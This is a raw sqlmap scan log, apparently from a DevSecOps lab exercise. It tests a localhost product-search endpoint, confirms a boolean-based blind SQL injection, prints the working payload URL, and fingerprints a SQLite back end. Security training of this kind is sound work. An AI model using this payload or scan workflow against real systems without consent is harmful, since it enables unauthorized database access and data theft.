        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.8.4#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 11:41:48 /2026-05-08/

[?1049h[22;0;0t[1;24r(B[m[4l[?7h[24;1H[?1049l[23;0;0t[?1l>[11:41:48] [WARNING] using '/home/nodo/DevSecOps/DevSecOps-Intro/labs/lab5/sqlmap' as the output directory
[1/1] URL:
GET http://localhost:3000/rest/products/search?q=*
do you want to test this URL? [Y/n/q]
> Y
[11:41:48] [INFO] testing URL 'http://localhost:3000/rest/products/search?q=*'
custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
[11:41:48] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
[11:41:48] [INFO] using '/home/nodo/DevSecOps/DevSecOps-Intro/labs/lab5/sqlmap/results-05082026_1141am.csv' as the CSV results file in multiple targets mode
[11:41:48] [INFO] testing connection to the target URL
[11:41:48] [INFO] checking if the target is protected by some kind of WAF/IPS
[11:41:49] [INFO] testing if the target URL content is stable
[11:41:49] [INFO] target URL content is stable
[11:41:49] [INFO] testing if URI parameter '#1*' is dynamic
[11:41:49] [INFO] URI parameter '#1*' appears to be dynamic
[11:41:49] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[11:41:49] [INFO] testing for SQL injection on URI parameter '#1*'
[11:41:49] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[11:41:49] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="The")
[11:41:49] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
[11:41:50] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 40 HTTP(s) requests:
---
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: http://localhost:3000/rest/products/search?q=') AND 6621=6621 AND ('qNtz' LIKE 'qNtz
---
do you want to exploit this SQL injection? [Y/n] Y
[11:41:50] [INFO] testing SQLite
[11:41:50] [INFO] confirming SQLite
[11:41:50] [INFO] actively fingerprinting SQLite
[11:41:50] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[11:41:50] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 10 times
[11:41:50] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/nodo/DevSecOps/DevSecOps-Intro/labs/lab5/sqlmap/results-05082026_1141am.csv'
[11:41:50] [WARNING] your sqlmap version is outdated

[*] ending @ 11:41:50 /2026-05-08/

